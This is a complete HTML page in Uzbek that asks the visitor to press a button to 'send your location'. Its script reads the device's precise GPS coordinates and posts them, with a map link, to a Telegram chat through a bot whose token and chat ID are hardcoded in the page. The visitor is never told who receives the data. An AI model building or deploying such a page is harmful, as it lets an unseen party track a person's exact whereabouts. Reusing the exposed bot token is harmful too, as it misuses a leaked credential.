<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Lokatsiya yuborish</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: #f0f2f5;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      text-align: center;
    }
    .container {
      padding: 20px;
    }
    button {
      background: #0088cc;
      color: white;
      border: none;
      padding: 16px 32px;
      font-size: 18px;
      border-radius: 12px;
      cursor: pointer;
      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
    }
    button:active {
      transform: scale(0.95);
    }
    .loading {
      margin-top: 20px;
      font-size: 18px;
    }
  </style>
</head>
<body>

  <div class="container">
    <h2>üìç Joylashuvingizni yuborish uchun quyidagi tugmani bosing</h2>
    <button id="getLocBtn">Lokatsiyani yuborish</button>
    <div class="loading" id="status"></div>
  </div>

  <script>
    const botToken = "5907600944:AAHRhcgacCszCkwiFmNgpzKN4pwvBg2-OxQ";
    const chatId = "1341701772";
    const statusEl = document.getElementById("status");
    const btn = document.getElementById("getLocBtn");

    function sendToTelegram(lat, lon) {
      const text = `üìç Yangi lokatsiya:\nLatitude: ${lat}\nLongitude: ${lon}\n\nüó∫ https://maps.google.com/?q=${lat},${lon}`;
      
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: text,
          parse_mode: "HTML"
        })
      })
      .then(() => {
        statusEl.innerHTML = "‚úÖ Lokatsiya muvaffaqiyatli yuborildi!";
        btn.textContent = "Yuborildi ‚úÖ";
        btn.disabled = true;
      })
      .catch(err => {
        console.error(err);
        statusEl.innerHTML = "‚ùå Xatolik yuz berdi. Qayta urining.";
      });
    }

    btn.addEventListener("click", function() {
      btn.textContent = "Lokatsiya olinmoqda...";
      statusEl.textContent = "Iltimos, ruxsat bering...";

      if (!navigator.geolocation) {
        statusEl.textContent = "Brauzeringiz lokatsiyani qo‚Äòllab-quvvatlamaydi.";
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          sendToTelegram(lat, lon);
        },
        (error) => {
          btn.textContent = "Qayta urinib ko‚Äòring";
          let msg = "";
          switch(error.code) {
            case error.PERMISSION_DENIED:
              msg = "Ruxsat rad etildi. Brauzer sozlamalarida lokatsiyaga ruxsat bering.";
              break;
            case error.POSITION_UNAVAILABLE:
              msg = "Lokatsiya ma'lumotlari mavjud emas.";
              break;
            case error.TIMEOUT:
              msg = "Vaqt tugadi. Internet va GPS ni tekshiring.";
              break;
            default:
              msg = "Noma'lum xatolik.";
          }
          statusEl.innerHTML = "‚ùå " + msg;
        },
        {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0
        }
      );
    });
  </script>
</body>
</html>
